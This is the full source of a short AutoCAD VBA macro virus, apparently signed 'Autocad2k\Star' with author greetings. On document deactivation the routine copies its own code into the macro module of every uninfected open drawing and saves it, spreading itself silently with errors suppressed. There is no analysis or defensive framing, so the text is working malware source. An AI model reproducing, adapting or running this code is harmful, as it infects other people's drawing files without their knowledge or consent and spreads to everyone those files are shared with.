Private Sub AcadDocument_Deactivate()
Set VBEModel = VBE
On Error GoTo runtonext
For i = 1 To Documents.Count
Set at = VBEModel.codepanes(i).codemodule
If at.lines(2, 1) = "Set VBEModel = VBE" And terr = 0 Then
newroutine = at.lines(1, at.countoflines)
terr = 1
i = 0
End If
If at.lines(2, 1) <> "Set VBEModel = VBE" And terr = 1 Then
VBEModel.codepanes(i).codemodule.InsertLines 1, newroutine
thisdocument.Save
End If
runtonext:
Next i
'[Autocad2k\Star]
'[A.s.T]
'Big Greetz to some0ne really special
'"You`ll always be a star in my sky"
End Sub
